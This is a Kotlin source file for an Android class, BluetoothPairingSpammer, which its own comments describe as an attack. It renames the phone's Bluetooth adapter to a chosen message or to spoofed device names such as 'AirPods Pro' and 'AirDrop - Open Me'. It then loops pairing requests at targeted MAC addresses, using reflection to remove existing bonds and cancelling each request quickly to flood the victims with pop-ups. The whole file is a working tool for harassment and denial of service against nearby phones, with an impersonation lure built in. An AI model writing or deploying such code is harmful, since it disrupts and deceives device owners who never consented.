package com.sunfeld.smsgateway

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow

/**
 * Sends mass Bluetooth pairing requests to selected target devices.
 *
 * The attack works by:
 * 1. Setting the local adapter name to a custom message (via setName())
 * 2. Calling createBond() on each target device
 * 3. The target phone shows a system pairing dialog with the custom name
 * 4. Cycling through targets and repeating
 *
 * This is the correct approach — the "message" IS the device name shown
 * in the pairing popup. No HID connection or keystrokes needed.
 */
class BluetoothPairingSpammer {

    companion object {
        private const val TAG = "BtPairingSpam"
        private const val BOND_CYCLE_DELAY_MS = 800L
        private const val BOND_FIRE_DELAY_MS = 500L
        private const val CRAY_CYCLE_DELAY_MS = 100L
        private const val CRAY_FIRE_DELAY_MS = 80L

        // Chaotic names rotated per-target in cray mode
        private val CRAY_NAMES = listOf(
            "Magic Keyboard", "Keyboard K380", "AirPods Pro",
            "Galaxy Buds Pro", "Beats Studio", "JBL Flip 6",
            "Sony WH-1000XM5", "Bose QC Ultra", "Free WiFi",
            "AirDrop - Open Me", "Ring Doorbell", "Tesla Model 3",
            "Fire TV Stick", "Chromecast", "Nintendo Switch",
            "Tile Tracker", "MX Keys", "Samsung Keyboard"
        )
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private val _connectionAttempts = MutableStateFlow(0)
    val connectionAttempts: StateFlow<Int> = _connectionAttempts.asStateFlow()

    private val _activeTargets = MutableStateFlow(0)
    val activeTargets: StateFlow<Int> = _activeTargets.asStateFlow()

    private val _lastError = MutableStateFlow<String?>(null)
    val lastError: StateFlow<String?> = _lastError.asStateFlow()

    private var adapter: BluetoothAdapter? = null
    private var originalAdapterName: String? = null
    private var customMessage: String = ""
    private var spamJob: Job? = null
    private var bondReceiver: BroadcastReceiver? = null
    private var appContext: Context? = null

    private var cycleDelay = BOND_CYCLE_DELAY_MS
    private var fireDelay = BOND_FIRE_DELAY_MS
    private var isCrayMode = false

    /**
     * Start spamming pairing requests to the given target devices.
     *
     * @param context Android context
     * @param customName The message to display (becomes the BT adapter name)
     * @param targets Set of MAC addresses to spam
     * @param discoveredDevices Full list of discovered BluetoothDevice objects
     * @param crayMode If true, uses turbo timing for maximum chaos
     */
    fun start(
        context: Context,
        customName: String,
        targets: Set<String>,
        discoveredDevices: List<BluetoothDevice>,
        crayMode: Boolean = false
    ) {
        cycleDelay = if (crayMode) CRAY_CYCLE_DELAY_MS else BOND_CYCLE_DELAY_MS
        fireDelay = if (crayMode) CRAY_FIRE_DELAY_MS else BOND_FIRE_DELAY_MS
        isCrayMode = crayMode
        appContext = context.applicationContext
        _lastError.value = null
        _connectionAttempts.value = 0
        _activeTargets.value = targets.size

        val btManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        adapter = btManager?.adapter

        if (adapter == null || adapter?.isEnabled != true) {
            _lastError.value = "Bluetooth not available or disabled"
            return
        }

        customMessage = customName

        // Step 1: Save original name and set custom message as BT name
        // Must set BEFORE any interaction with targets to avoid name caching
        try {
            originalAdapterName = adapter?.name
            adapter?.setName(customName)
            Log.d(TAG, "Adapter name set to: '$customName' (was: '$originalAdapterName')")
            // Wait for name to propagate to EIR (Extended Inquiry Response)
            Thread.sleep(500)
            // Verify name was actually set
            val verifiedName = adapter?.name
            Log.d(TAG, "Adapter name verified: '$verifiedName'")
            CrashLogger.log(context, TAG, "Started pairing spam: name='$customName' verified='$verifiedName' targets=${targets.size}")
        } catch (e: SecurityException) {
            Log.e(TAG, "Failed to set adapter name", e)
            _lastError.value = "Permission denied: cannot set Bluetooth name"
            return
        }

        // Register receiver to track bond state changes
        registerBondReceiver(context)

        // Step 2: Get actual BluetoothDevice objects for targets
        val targetDevices = discoveredDevices.filter { targets.contains(it.address) }

        if (targetDevices.isEmpty()) {
            _lastError.value = "No target devices found"
            return
        }

        // Step 3: Start the spam loop
        spamJob = scope.launch {
            Log.d(TAG, "Spam loop started for ${targetDevices.size} targets")
            while (isActive) {
                for (device in targetDevices) {
                    if (!isActive) break
                    try {
                        sendPairingRequest(device)
                        _connectionAttempts.value++
                    } catch (e: Exception) {
                        Log.w(TAG, "Pairing request to ${device.address} failed: ${e.message}")
                    }
                    delay(cycleDelay)
                }
            }
        }
    }

    private suspend fun sendPairingRequest(device: BluetoothDevice) {
        val address = device.address
        try {
            // Set name before EVERY bond attempt — in cray mode, rotate to random name
            val nameToUse = if (isCrayMode) CRAY_NAMES.random() else customMessage
            try {
                adapter?.setName(nameToUse)
            } catch (_: SecurityException) { }

            // Remove existing bond first (if bonded, createBond won't show dialog)
            val bondState = device.bondState
            val bondDelay = if (isCrayMode) 50L else 300L
            if (bondState == BluetoothDevice.BOND_BONDED) {
                Log.d(TAG, "Removing existing bond with $address")
                removeBond(device)
                delay(bondDelay)
            } else if (bondState == BluetoothDevice.BOND_BONDING) {
                cancelBond(device)
                delay(bondDelay)
            }

            // createBond() triggers the pairing dialog on the target device
            // The dialog shows our custom adapter name as the requesting device
            Log.d(TAG, "Sending pairing request to $address (bond=$bondState, name='${adapter?.name}')")
            val result = device.createBond()
            Log.d(TAG, "createBond($address) returned: $result")

            // Fire-and-forget: cancel bond after short delay so we don't wait
            // for user approval — allows fast iteration over a list of targets
            delay(fireDelay)
            cancelBond(device)
        } catch (e: SecurityException) {
            Log.w(TAG, "SecurityException sending pairing to $address", e)
        } catch (e: Exception) {
            Log.w(TAG, "Error sending pairing to $address: ${e.message}", e)
        }
    }

    private fun cancelBond(device: BluetoothDevice) {
        try {
            val cancelMethod = device.javaClass.getMethod("cancelBondProcess")
            cancelMethod.invoke(device)
            Log.d(TAG, "Cancelled bond with ${device.address}")
        } catch (_: Exception) { }
    }

    /**
     * Remove an existing bond using reflection (no public API for this).
     */
    private fun removeBond(device: BluetoothDevice) {
        try {
            val method = device.javaClass.getMethod("removeBond")
            method.invoke(device)
            Log.d(TAG, "removeBond(${device.address}) invoked")
        } catch (e: Exception) {
            Log.w(TAG, "removeBond failed for ${device.address}: ${e.message}")
        }
    }

    fun stop(context: Context) {
        Log.d(TAG, "Stopping pairing spam")
        spamJob?.cancel()
        spamJob = null

        // Restore original adapter name
        originalAdapterName?.let { name ->
            try {
                adapter?.setName(name)
                Log.d(TAG, "Restored adapter name to: '$name'")
            } catch (_: SecurityException) { }
        }

        // Unregister bond receiver
        bondReceiver?.let {
            try { context.unregisterReceiver(it) } catch (_: Exception) { }
        }
        bondReceiver = null
    }

    private fun registerBondReceiver(context: Context) {
        bondReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                if (intent.action == BluetoothDevice.ACTION_BOND_STATE_CHANGED) {
                    val device = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
                    } else {
                        @Suppress("DEPRECATION")
                        intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                    }
                    val state = intent.getIntExtra(BluetoothDevice.EXTRA_BOND_STATE, BluetoothDevice.BOND_NONE)
                    val prevState = intent.getIntExtra(BluetoothDevice.EXTRA_PREVIOUS_BOND_STATE, BluetoothDevice.BOND_NONE)
                    val stateName = when (state) {
                        BluetoothDevice.BOND_NONE -> "NONE"
                        BluetoothDevice.BOND_BONDING -> "BONDING"
                        BluetoothDevice.BOND_BONDED -> "BONDED"
                        else -> "UNKNOWN($state)"
                    }
                    Log.d(TAG, "Bond state: ${device?.address} $prevState -> $stateName")
                }
            }
        }

        val filter = IntentFilter(BluetoothDevice.ACTION_BOND_STATE_CHANGED)
        try {
            ContextCompat.registerReceiver(
                context,
                bondReceiver!!,
                filter,
                ContextCompat.RECEIVER_EXPORTED
            )
        } catch (e: Exception) {
            Log.w(TAG, "Failed to register bond receiver: ${e.message}")
        }
    }
}
